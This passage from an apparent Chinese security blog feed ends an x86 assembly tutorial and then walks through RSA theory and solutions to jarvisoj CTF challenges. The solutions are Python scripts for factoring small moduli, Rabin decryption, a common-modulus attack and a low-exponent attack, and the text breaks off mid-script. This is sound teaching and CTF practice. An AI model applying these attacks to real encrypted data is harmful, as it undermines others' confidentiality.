</div><div class="line">	<span class="keyword">add</span>	<span class="built_in">eax</span>, [b]</div><div class="line">        <span class="keyword">mov</span>	[c], <span class="built_in">eax</span>	</div><div class="line">	<span class="keyword">push</span>	<span class="built_in">eax</span>		</div><div class="line">        <span class="keyword">push</span>    <span class="built_in">dword</span> [c]	</div><div class="line">        <span class="keyword">push</span>    <span class="built_in">dword</span> fmt	</div><div class="line">        <span class="keyword">call</span>    printf		</div><div class="line">        <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">12</span>		</div><div class="line"></div><div class="line">        <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span>	</div><div class="line">        <span class="keyword">pop</span>     <span class="built_in">ebp</span>		</div><div class="line"></div><div class="line">	<span class="keyword">mov</span>	<span class="built_in">eax</span>,<span class="number">0</span>		</div><div class="line">	<span class="keyword">ret</span></div></pre></td></tr></table></figure>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>nasm -f elf32 sum.asm</div><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>gcc -m32 -o sum sum.o</div><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>./sum</div><div class="line"><span class="symbol">sum:</span>c=a+b=<span class="number">12</span></div></pre></td></tr></table></figure>
<p>3.斐波那契数列</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">extern</span>  printf</div><div class="line"></div><div class="line"><span class="meta">section</span> .data</div><div class="line"><span class="symbol">format:</span>  <span class="built_in">db</span>  <span class="string">"SDPC==&gt;%ld"</span>, <span class="number">10</span>, <span class="number">0</span></div><div class="line"></div><div class="line"><span class="meta">section</span> .text</div><div class="line"><span class="meta">global</span>  main</div><div class="line"><span class="symbol">main:</span></div><div class="line">        <span class="keyword">push</span>    <span class="built_in">rbx</span>                     </div><div class="line"></div><div class="line">        <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">10</span>                 </div><div class="line">        <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rax</span>               </div><div class="line">        <span class="keyword">xor</span>     <span class="built_in">rbx</span>, <span class="built_in">rbx</span>               </div><div class="line">        <span class="keyword">inc</span>     <span class="built_in">rbx</span> </div><div class="line"><span class="symbol">                </span></div><div class="line">Fibonacci:</div><div class="line">        <span class="keyword">push</span>    <span class="built_in">rax</span>                     </div><div class="line">        <span class="keyword">push</span>    <span class="built_in">rcx</span>                     </div><div class="line"></div><div class="line">        <span class="keyword">mov</span>     <span class="built_in">rdi</span>, format             </div><div class="line">        <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span>                </div><div class="line">        <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rax</span>                 </div><div class="line"></div><div class="line">        <span class="keyword">call</span>    printf                </div><div class="line"></div><div class="line">        <span class="keyword">pop</span>     <span class="built_in">rcx</span>                   </div><div class="line">        <span class="keyword">pop</span>     <span class="built_in">rax</span>                    </div><div class="line"></div><div class="line">        <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rax</span>             </div><div class="line">        <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">rbx</span>              </div><div class="line">        <span class="keyword">add</span>     <span class="built_in">rbx</span>, <span class="built_in">rdx</span>            </div><div class="line">        <span class="keyword">dec</span>     <span class="built_in">ecx</span>        </div><div class="line">        <span class="keyword">jnz</span>     Fibonacci       </div><div class="line"></div><div class="line">        <span class="keyword">pop</span>     <span class="built_in">rbx</span>                  </div><div class="line">        <span class="keyword">ret</span></div></pre></td></tr></table></figure>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>gcc -m64 -o fibonacci fibonacci.o</div><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>nasm -f elf64 fibonacci.asm </div><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>gcc -m64 -o fibonacci fibonacci.o</div><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>./fibonacci </div><div class="line">SDPC==&gt;<span class="number">0</span></div><div class="line">SDPC==&gt;<span class="number">1</span></div><div class="line">SDPC==&gt;<span class="number">1</span></div><div class="line">SDPC==&gt;<span class="number">2</span></div><div class="line">SDPC==&gt;<span class="number">3</span></div><div class="line">SDPC==&gt;<span class="number">5</span></div><div class="line">SDPC==&gt;<span class="number">8</span></div><div class="line">SDPC==&gt;<span class="number">13</span></div><div class="line">SDPC==&gt;<span class="number">21</span></div><div class="line">SDPC==&gt;<span class="number">34</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;汇编&quot;&gt;&lt;a href=&quot;#汇编&quot; class=&quot;headerlink&quot; title=&quot;汇编&quot;&gt;&lt;/a&gt;汇编&lt;/h1&gt;&lt;p&gt;汇编语言（assembly language）是一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符（Mnemonics）代替机器指令的操作码，用地址符号（Symbol）或标号（Label）代替指令或操作数的地址。在不同的设备中，汇编语言对应着不同的机器语言指令集，通过汇编过程转换成机器指令。普遍地说，特定的汇编语言和特定的机器语言指令集是一一对应的,不同平台之间不可直接移植。&lt;br&gt;
    
    </summary>
    
    
      <category term="Foundation" scheme="http://pwnable.me/tags/Foundation/"/>
    
  </entry>
  
  <entry>
    <title>RSA</title>
    <link href="http://pwnable.me/2017/01/02/RSA/"/>
    <id>http://pwnable.me/2017/01/02/RSA/</id>
    <published>2017-01-02T02:23:42.000Z</published>
    <updated>2017-06-04T05:30:02.276Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（AdiShamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年首次公布，当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。<br>RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。<br>RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。<br>RSA的安全性依赖于大数分解，但是否等同于大数分解一直未能得到理论上的证明，因为没有证明破解RSA就一定需要作大数分解。假设存在一种无须分解大数的算法，那它肯定可以修改成为大数分解算法。 RSA 的一些变种算法已被证明等价于大数分解。不管怎样，分解n是最显然的攻击方法。人们已能分解多个十进制位的大素数。因此，模数n必须选大一些，因具体适用情况而定。</p>
<a id="more"></a>
<h2 id="数论知识"><a href="#数论知识" class="headerlink" title="数论知识"></a>数论知识</h2><ul>
<li>互质关系</li>
<li>欧拉函数</li>
<li>欧拉定理</li>
<li>欧拉准则</li>
<li>中国剩余定理</li>
<li>模反元素</li>
</ul>
<h2 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h2><p>1.随机选择两个不相等的质数p,q<br>2.计算p和q的乘积n<br>3.计算n的欧拉函数φ(n)=(p-1)(q-1)<br>4.随机选择一个整数e,条件是1&lt;e&lt;φ(n),且e与φ(n)互质<br>5.计算e与φ(n)的模反元素d<br>6.将n与e封装成公钥(n,e)，将n与d封装成私钥(n,d)</p>
<h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>用公钥(n,e),对m进行加密，得到密文c</p>
<p> c ≡ me mod n</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">例：已知公钥(<span class="number">920139713</span>,<span class="number">19</span>),对明文m加密后得到密文c=[<span class="number">704796792</span>,<span class="number">752211152</span>,<span class="number">274704164</span>,<span class="number">18414022</span>,<span class="number">368270835</span>,<span class="number">483295235</span>,<span class="number">263072905</span>,<span class="number">459788476</span>,<span class="number">483295235</span>,<span class="number">459788476</span>,<span class="number">663551792</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">428313374</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">425392137</span>,<span class="number">704796792</span>,<span class="number">458265677</span>,<span class="number">341524652</span>,<span class="number">483295235</span>,<span class="number">534149509</span>,<span class="number">425392137</span>,<span class="number">428313374</span>,<span class="number">425392137</span>,<span class="number">341524652</span>,<span class="number">458265677</span>,<span class="number">263072905</span>,<span class="number">483295235</span>,<span class="number">828509797</span>,<span class="number">341524652</span>,<span class="number">425392137</span>,<span class="number">475206804</span>,<span class="number">428313374</span>,<span class="number">483295235</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">306220148</span>]</div></pre></td></tr></table></figure>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>用私钥(n,d),对c进行解密，得到明文m</p>
<p> m ≡ cd mod n</p>
<p>思路：分解n,求p,q,进而得到d,对密文c解密得到明文m<br>解密代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> gmpy2</div><div class="line">char=[<span class="number">704796792</span>,<span class="number">752211152</span>,<span class="number">274704164</span>,<span class="number">18414022</span>,<span class="number">368270835</span>,<span class="number">483295235</span>,<span class="number">263072905</span>,<span class="number">459788476</span>,<span class="number">483295235</span>,<span class="number">459788476</span>,<span class="number">663551792</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">428313374</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">425392137</span>,<span class="number">704796792</span>,<span class="number">458265677</span>,<span class="number">341524652</span>,<span class="number">483295235</span>,<span class="number">534149509</span>,<span class="number">425392137</span>,<span class="number">428313374</span>,<span class="number">425392137</span>,<span class="number">341524652</span>,<span class="number">458265677</span>,<span class="number">263072905</span>,<span class="number">483295235</span>,<span class="number">828509797</span>,<span class="number">341524652</span>,<span class="number">425392137</span>,<span class="number">475206804</span>,<span class="number">428313374</span>,<span class="number">483295235</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">306220148</span>]</div><div class="line">n = <span class="number">920139713</span></div><div class="line">p = <span class="number">18443</span></div><div class="line">q = <span class="number">49891</span></div><div class="line">e = <span class="number">19</span></div><div class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> char:</div><div class="line">    <span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c,d,n)).decode(<span class="string">'hex'</span>)</div></pre></td></tr></table></figure>
<p>解得明文m：flag{13212je2ue28fy71w8u87y31r78eu1e2}</p>
<h2 id="CTF之RSA"><a href="#CTF之RSA" class="headerlink" title="CTF之RSA"></a>CTF之RSA</h2><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><ul>
<li>factordb，Sagemath，yafu</li>
<li>openssl</li>
<li>python gmpy2</li>
<li>rsatool</li>
</ul>
<h3 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h3><p>题目来源：<br><a href="http://www.jarvisoj.com" target="_blank" rel="external">http://www.jarvisoj.com</a><br><a href="http://www.ichunqiu.com/racing/54627" target="_blank" rel="external">http://www.ichunqiu.com/racing/54627</a></p>
<h4 id="very-easy-RSA"><a href="#very-easy-RSA" class="headerlink" title="very easy RSA"></a>very easy RSA</h4><p>已知RSA公钥生成参数：<br>p = 3487583947589437589237958723892346254777<br>q = 876786784356893476598347658437658389<br>e = 65537<br>求d =<br>(1)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">q = <span class="number">876786784356893476598347658437658389</span></div><div class="line">e = <span class="number">65537</span>  </div><div class="line">t = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)   </div><div class="line">i=<span class="number">0</span>  </div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span> :   </div><div class="line">    <span class="keyword">if</span> (<span class="number">1</span>-t*i)%e == <span class="number">0</span>:   </div><div class="line">        <span class="keyword">break</span>   </div><div class="line">    i-=<span class="number">1</span>   </div><div class="line">    <span class="comment">#print i </span></div><div class="line"><span class="keyword">print</span> <span class="string">'d='</span> + <span class="string">'%d'</span> % ((<span class="number">1</span>-t*i)/e)</div></pre></td></tr></table></figure>
<p>(2)python gmpy2模块解决</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">p = <span class="number">3487583947589437589237958723892346254777</span> </div><div class="line">q = <span class="number">876786784356893476598347658437658389</span></div><div class="line">e = <span class="number">65537</span>  </div><div class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>)) </div><div class="line"><span class="keyword">print</span> d</div></pre></td></tr></table></figure>
<p>(3）RSAtool<br><a href="https://github.com/ius/rsatool" target="_blank" rel="external">https://github.com/ius/rsatool</a></p>
<h4 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy RSA"></a>easy RSA</h4><p>已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的<br>公钥：(N=322831561921859,e = 23),求加密字符串<br>N分解为13574881*23781539</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> gmpy2</div><div class="line">n = <span class="number">322831561921859</span></div><div class="line">p = <span class="number">13574881</span></div><div class="line">q = <span class="number">23781539</span> </div><div class="line">e = <span class="number">23</span> </div><div class="line">c = int(<span class="string">'0xdc2eeeb2782c'</span>,<span class="number">16</span>)</div><div class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>)) </div><div class="line"><span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c,d,n)).decode(<span class="string">'hex'</span>)</div></pre></td></tr></table></figure>
<h4 id="medium-RSA"><a href="#medium-RSA" class="headerlink" title="medium RSA"></a>medium RSA</h4><p>已知flag.enc和pubkey.pem<br>提取公钥<br>1.利用python的Crypto</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line">A = RSA.importKey(open(<span class="string">'pubkey.pem'</span>).read())</div><div class="line"><span class="keyword">print</span> <span class="string">'N:'</span> + <span class="string">'%d'</span> % A.n</div><div class="line"><span class="keyword">print</span> <span class="string">'e:'</span> + <span class="string">'%d'</span> % A.e</div></pre></td></tr></table></figure>
<p>N:87924348264132406875276140514499937145050893665602592992418171647042491658461<br>e:65537</p>
<p>2.openssl</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">openssl rsa -pubin -text -modulus -<span class="keyword">in</span> warmup -<span class="keyword">in</span> pubkey.pem</div><div class="line">Public-<span class="string">Key:</span> (<span class="number">256</span> bit)</div><div class="line"><span class="string">Modulus:</span></div><div class="line"><span class="symbol">    00:</span><span class="string">c2:</span><span class="number">63</span>:<span class="number">6</span><span class="string">a:</span><span class="string">e5:</span><span class="string">c3:</span><span class="string">d8:</span><span class="string">e4:</span><span class="number">3</span><span class="string">f:</span><span class="string">fb:</span><span class="number">97</span>:<span class="string">ab:</span><span class="number">09</span>:<span class="number">02</span>:<span class="number">8</span><span class="string">f:</span></div><div class="line"><span class="symbol">    1a:</span><span class="string">ac:</span><span class="number">6</span><span class="string">c:</span><span class="number">0</span><span class="string">b:</span><span class="string">f6:</span><span class="string">cd:</span><span class="number">3</span><span class="string">d:</span><span class="number">70</span>:<span class="string">eb:</span><span class="string">ca:</span><span class="number">28</span>:<span class="number">1</span><span class="string">b:</span><span class="string">ff:</span><span class="string">e9:</span><span class="number">7</span><span class="string">f:</span></div><div class="line"><span class="symbol">    be:</span><span class="number">30</span>:dd</div><div class="line"><span class="string">Exponent:</span> <span class="number">65537</span> (<span class="number">0x10001</span>)</div><div class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</div><div class="line">writing RSA key</div><div class="line">-----BEGIN PUBLIC KEY-----</div><div class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ<span class="regexp">/+5erCQKPGqxsC/</span>bNPXDr</div><div class="line">yigb<span class="regexp">/+l/</span>vjDdAgMBAAE=</div><div class="line">-----END PUBLIC KEY----</div></pre></td></tr></table></figure>
<p>3.yafu分解N</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">factor(87924348264132406875276140514499937145050893665602592992418171647042491658461)</div><div class="line">fac: using pretesting plan: normal</div><div class="line">fac: no tune info: using qs/gnfs crossover of 95 digits</div><div class="line"></div><div class="line">starting SIQS on c77: 87924348264132406875276140514499937145050893665602592992418171647042491658461</div><div class="line"></div><div class="line"><span class="section">==== sieving in progress (1 thread):   36224 relations needed ====</span></div><div class="line"><span class="section">====           Press ctrl-c to abort and save state           ====</span></div><div class="line"></div><div class="line"></div><div class="line">SIQS elapsed time = 1.9607 seconds.</div><div class="line">Total factoring time = 2.0212 seconds</div><div class="line"></div><div class="line"></div><div class="line">**<span class="strong">*factors found*</span>**</div><div class="line"></div><div class="line">P39 = 319576316814478949870590164193048041239</div><div class="line">P39 = 275127860351348928173285174381581152299</div><div class="line">ans = 1</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> libnum</div><div class="line"><span class="keyword">import</span> gmpy2</div><div class="line">f = open(<span class="string">'flag.enc'</span>,<span class="string">'r'</span>)</div><div class="line">c = f.read()</div><div class="line">c = libnum.s2n(c)</div><div class="line">p = <span class="number">275127860351348928173285174381581152299</span></div><div class="line">q = <span class="number">319576316814478949870590164193048041239</span></div><div class="line">e = <span class="number">65537</span></div><div class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</div><div class="line">n = p*q</div><div class="line">r = pow(c,d,n)</div><div class="line"><span class="keyword">print</span> libnum.n2s(r%n)</div></pre></td></tr></table></figure>
<h4 id="hard-RSA-Rabin密码"><a href="#hard-RSA-Rabin密码" class="headerlink" title="hard RSA(Rabin密码)"></a>hard RSA(Rabin密码)</h4><p>N=87924348264132406875276140514499937145050893665602592992418171647042491658461<br>e=2<br>Rabin密码<br>加密：c = m2 mod n<br>解密：m2 = c mod n<br>n的值为公钥，p和q为私钥,n是可以分解的,分解后可以得到p,q。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> libnum</div><div class="line"><span class="keyword">import</span> gmpy2</div><div class="line">f = open(<span class="string">'flag.enc'</span>,<span class="string">'r'</span>)</div><div class="line">c = f.read()</div><div class="line">c = libnum.s2n(c)</div><div class="line">p = <span class="number">275127860351348928173285174381581152299</span></div><div class="line">q = <span class="number">319576316814478949870590164193048041239</span></div><div class="line">n = p*q</div><div class="line">r = pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</div><div class="line">s = pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</div><div class="line">a = gmpy2.invert(p,q)</div><div class="line">b = gmpy2.invert(q,p)</div><div class="line">x =(a*p*s+b*q*r)%n</div><div class="line">y =(a*p*s-b*q*r)%n</div><div class="line"><span class="keyword">print</span> libnum.n2s(x%n)</div><div class="line"><span class="keyword">print</span> libnum.n2s((-x)%n)</div><div class="line"><span class="keyword">print</span> libnum.n2s(y%n)</div><div class="line"><span class="keyword">print</span> libnum.n2s((-y)%n)</div></pre></td></tr></table></figure>
<h4 id="very-hard-RSA"><a href="#very-hard-RSA" class="headerlink" title="very hard RSA"></a>very hard RSA</h4><p>分析加密脚本，使用了相同的N,不同的e,加密相同的数据,且两个加密指数互素，可以通过共模攻击在两个密文和公钥被嗅探的情况下还原出明文m的值</p>
<p>两个加密指数互质(e1,e2)=1,即存在s1,s2使得s1e1+s2e2=1<br>c1 ≡ me1 mod n<br>c2 ≡ me2 mod n<br>即 c1s1 c2s2 ≡ m mod n</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</div><div class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</div><div class="line">n=<span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></div><div class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</div><div class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    g, y, x = egcd(b % a, a)</div><div class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</div><div class="line">fo1 = open(<span class="string">'flag.enc1'</span>, <span class="string">'rb'</span>)</div><div class="line">fo2 = open(<span class="string">'flag.enc2'</span>, <span class="string">'rb'</span>)</div><div class="line">datafo1 = fo1.read()</div><div class="line">c1 = s2n(datafo1)</div><div class="line">fo1.close()</div><div class="line">datafo2 = fo2.read()</div><div class="line">c2 = s2n(datafo2)</div><div class="line">fo2.close()</div><div class="line">c2 = invert(c2,n)</div><div class="line">e1 = <span class="number">17</span></div><div class="line">e2 = <span class="number">65537</span></div><div class="line">s = egcd(e1,e2)</div><div class="line">s1 = s[<span class="number">1</span>]</div><div class="line">s2 = s[<span class="number">2</span>]</div><div class="line">s2 = - s2</div><div class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</div><div class="line"><span class="keyword">print</span> n2s(m)</div></pre></td></tr></table></figure>
<h4 id="Extremely-hard-RSA"><a href="#Extremely-hard-RSA" class="headerlink" title="Extremely hard RSA"></a>Extremely hard RSA</h4><p>解pubkey.pem发现N特别大，但e=3,可以进行低加密指数攻击<br>在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p>
<p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。<br>即：c ≡ me mod n</p>
<p>如果e=3，且me &lt; n,<br>那么：c = me , e=3</p>
<p>如果明文的三次方比n大，但是不是足够大，那么设k，<br>有：c ≡ me +kn<br>爆破k,如果c−kn能开三次根式，那么可以直接得到明文。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n,n2s</div><div class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</div><div class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></div><div class="line">e = <span class="number">3</span></div><div class="line">f = open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>)</div><div class="line">c= f.read()</div><div class="line">c = s2n(c)</div><div class="line">f.close()</div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    res = iroot(c+i*n,<span class="number">3</span>)</div><div 